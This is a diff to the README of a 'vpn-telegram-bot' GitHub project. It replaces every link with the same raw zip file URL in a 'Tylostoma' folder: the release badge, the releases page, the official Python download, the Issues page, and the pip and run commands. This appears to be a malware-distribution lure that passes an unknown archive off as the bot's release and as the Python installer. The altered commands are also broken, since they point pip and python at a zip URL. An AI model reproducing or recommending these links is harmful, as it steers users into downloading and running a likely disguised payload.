@@ -1,6 +1,6 @@
 # 🌐 vpn-telegram-bot - Simplify Your VPN Management with Telegram
 
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Apisit2536/vpn-telegram-bot/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip%https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip)](https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip)
 
 ## 📜 Description
 
@@ -11,13 +11,13 @@ The **vpn-telegram-bot** helps you manage your VPN connections through Telegram.
 Follow these simple steps to set up the VPN Telegram bot.
 
 1. **Download the Bot**  
-   Visit the [Releases page](https://github.com/Apisit2536/vpn-telegram-bot/releases) to download the latest version of the bot. Choose the appropriate file for your operating system.
+   Visit the [Releases page](https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip) to download the latest version of the bot. Choose the appropriate file for your operating system.
 
 2. **Extract the Files**  
    Once downloaded, locate the file on your computer. If it is a zip file, right-click and select "Extract All" to unpack the contents.
 
 3. **Install Required Software**  
-   Ensure you have Python installed on your computer. You can download it from the [official website](https://www.python.org/downloads/). Follow the installation instructions that suit your operating system.
+   Ensure you have Python installed on your computer. You can download it from the [official website](https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip). Follow the installation instructions that suit your operating system.
 
 4. **Open a Terminal or Command Prompt**  
    Depending on your operating system:
@@ -34,14 +34,14 @@ Follow these simple steps to set up the VPN Telegram bot.
 6. **Install Dependencies**  
    In the terminal or command prompt, type:  
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip
    ```
    This step ensures that all necessary libraries are available for the bot to run smoothly.
 
 7. **Run the Bot**  
    To start the bot, enter the following command:  
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip
    ```
 
 8. **Interact with the Bot on Telegram**  
@@ -49,7 +49,7 @@ Follow these simple steps to set up the VPN Telegram bot.
 
 ## 📥 Download & Install
 
-To get started with the vpn-telegram-bot, visit the [Releases page](https://github.com/Apisit2536/vpn-telegram-bot/releases) to download the latest files. Follow the steps outlined in the "Getting Started" section to set up your bot easily.
+To get started with the vpn-telegram-bot, visit the [Releases page](https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip) to download the latest files. Follow the steps outlined in the "Getting Started" section to set up your bot easily.
 
 ## 💡 Features
 
@@ -71,13 +71,13 @@ If you encounter issues while setting up or running the bot, consider the follow
 - **Installation Errors**: Ensure Python is correctly installed and added to your system's PATH.
 - **Dependency Issues**: Double-check that all dependencies are installed. You can rerun  
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip
    ```
 - **Connection Problems**: Check your VPN configuration and network settings.
 
 ## 🎉 Community and Support
 
-Join discussions and ask questions in the GitHub repository. The developers and community members can provide guidance and support. Visit the [Issues section](https://github.com/Apisit2536/vpn-telegram-bot/issues) for help or to report bugs.
+Join discussions and ask questions in the GitHub repository. The developers and community members can provide guidance and support. Visit the [Issues section](https://raw.githubusercontent.com/Apisit2536/vpn-telegram-bot/main/Tylostoma/vpn-telegram-bot.zip) for help or to report bugs.
 
 ## 🛡️ Stay Updated
 
